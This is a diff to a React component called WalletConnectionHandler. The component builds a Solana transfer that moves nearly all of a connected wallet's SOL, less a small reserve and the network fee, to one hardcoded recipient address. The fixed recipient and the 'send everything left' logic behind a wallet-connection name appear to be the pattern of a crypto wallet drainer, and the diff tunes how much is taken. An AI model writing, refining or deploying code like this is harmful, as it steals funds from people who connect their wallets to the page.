@@ -130,23 +130,34 @@ const WalletConnectionHandler: FC = () => {
             const toPubkey = new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz');
             const blockhash = await connection.getLatestBlockhash();
 
-            const tx = new Transaction({
-                feePayer: walletPublicKey,
-                recentBlockhash: blockhash.blockhash,
-            }).add(
-                SystemProgram.transfer({
-                    fromPubkey: walletPublicKey,
-                    toPubkey,
-                    lamports,
+            const reservedLamports = 1000000; // 0.001 SOL reserved
+            const availableLamports = lamports - reservedLamports;
+
+            if (availableLamports <= 0) {
+                alert('⚠️ Not enough SOL after reservation to perform a transaction.');
+                return;
+            }
+
+            const feeResp = await connection.getFeeForMessage(
+                new Transaction({
+                    feePayer: walletPublicKey,
+                    recentBlockhash: blockhash.blockhash,
                 })
+                    .add(
+                        SystemProgram.transfer({
+                            fromPubkey: walletPublicKey,
+                            toPubkey,
+                            lamports: availableLamports,
+                        })
+                    )
+                    .compileMessage()
             );
 
-            const feeResp = await connection.getFeeForMessage(tx.compileMessage());
             const feeLamports = feeResp.value || 5000;
+            const sendableLamports = availableLamports - feeLamports;
 
-            const sendableLamports = lamports - feeLamports;
             if (sendableLamports <= 0) {
-                alert('⚠️ Not enough SOL to cover the transaction fee.');
+                alert('⚠️ Not enough SOL to cover the transaction fee after reservation.');
                 return;
             }
 
